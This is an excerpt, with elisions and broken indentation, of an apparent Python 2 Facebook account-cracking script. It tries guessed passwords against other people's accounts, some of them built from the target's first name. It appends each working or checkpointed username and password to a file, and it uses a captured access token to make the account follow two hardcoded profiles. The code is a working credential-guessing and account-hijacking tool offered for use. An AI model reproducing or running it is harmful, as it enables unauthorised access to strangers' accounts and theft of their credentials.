...
def bot_follow():
	try:
    	...
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #NAM TU SUNA HUGA
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #IM THE ONE
    	menu()
		...
		try:
			...
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				...
				if 'checkpoint' in xo:
					...
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\x1b[0;32m   [MZ] '+user+' • '+pass2+' • '+tl
						oke = open('done/Indo.txt', 'a')
						oke.write('\n[MZ] '+user+' • '+pass2)
						oke.close()
						...
						if 'checkpoint' in xo:
							print '\x1b[0;33m   [MZ] '+user+' • '+pass2+' • '+tl
							cek = open('done/Indo.txt', 'a')
							cek.write('\n[MZ] '+user+' • '+pass2)
							cek.close()
							...
							pass3 = b['first_name'].lower()
                            				...
                            				xo = rex.content
                            				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                				print '\x1b[0;32m   [MZ] '+user+' • '+pass3+' • '+tl
                                				oke = open('done/Indo.txt', 'a')
                                				oke.write('\n[MZ] '+user+' • '+pass3)
                                				oke.close()
                                				...
                                				if 'checkpoint' in xo:
                                    					print '\x1b[0;33m   [MZ] '+user+' • '+pass3+' • '+tl
                                    					cek = open('done/Indo.txt', 'a')
                                    					cek.write('\n[MZ] '+user+' • '+pass3)
                                    					cek.close()
                                    					...
                                    					xo = rex.content
                                    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        					print '\x1b[0;32m   [MZ] '+user+' • '+pass4+' • '+tl
                                        					oke = open('done/Indo.txt', 'a')
										oke.write('\n[MZ] '+user+' • '+pass4)
                                        					oke.close()
                                        					...
                                        					if 'checkpoint' in xo:
                                            						print '\x1b[0;33m   [MZ] '+user+' • '+pass4+' • '+tl
                                            						cek = open('done/Indo.txt', 'a')
                                            						cek.write('\n[MZ] '+user+' • '+pass4)
                                            						cek.close()
                                    							...
                                    							xo = rex.content
                                    							if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        							print '\x1b[0;32m   [MZ] '+user+' • '+pass5+' • '+tl
                                        							oke = open('done/Indo.txt', 'a')
												oke.write('\n[MZ] '+user+' • '+pass5)
                                        							oke.close()
                                        							...
                                        							if 'checkpoint' in xo:
                                            								print '\x1b[0;33m   [MZ] '+user+' • '+pass5+' • '+tl
                                            								cek = open('done/Indo.txt', 'a')
                                            								cek.write('\n[MZ] '+user+' • '+pass5)
                                            								cek.close()
                                    									...
                                    									xo = rex.content
                                    									if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        									print '\x1b[0;32m   [MZ] '+user+' • '+pass6+' • '+tl
                                        									oke = open('done/Indo.txt', 'a')
														oke.write('\n[MZ] '+user+' • '+pass6)
                                        									oke.close()
                                        									...
                                        									if 'checkpoint' in xo:
                                            										print '\x1b[0;33m   [MZ] '+user+' • '+pass6+' • '+tl
                                            										cek = open('done/Indo.txt', 'a')
                                            										cek.write('\n[MZ] '+user+' • '+pass6)
                                            										cek.close()
                                    											...
                                    											xo = rex.content
                                    											if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        											print '\x1b[0;32m   [MZ] '+user+' • '+pass7+' • '+tl
                                        											oke = open('done/Indo.txt', 'a')
																oke.write('\n[MZ] '+user+' • '+pass7)
                                        											oke.close()
                                        											...
                                        											if 'checkpoint' in xo:
                                            												print '\x1b[0;33m   [MZ] '+user+' • '+pass7+' • '+tl
                                            												cek = open('done/Indo.txt', 'a')
                                            												cek.write('\n[MZ] '+user+' • '+pass7)
                                            												cek.close()
                                    													...
                                    													xo = rex.content
                                    													if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        													print '\x1b[0;32m   [MZ] '+user+' • '+pass8+' • '+tl
                                        													oke = open('done/Indo.txt', 'a')
																		oke.write('\n[MZ] '+user+' • '+pass8)
                                        													oke.close()
                                        													...
                                        													if 'checkpoint' in xo:
                                            														print '\x1b[0;33m   [MZ] '+user+' • '+pass8+' • '+tl
                                            														cek = open('done/Indo.txt', 'a')
                                            														cek.write('\n[MZ] '+user+' • '+pass8)
                                            														cek.close()
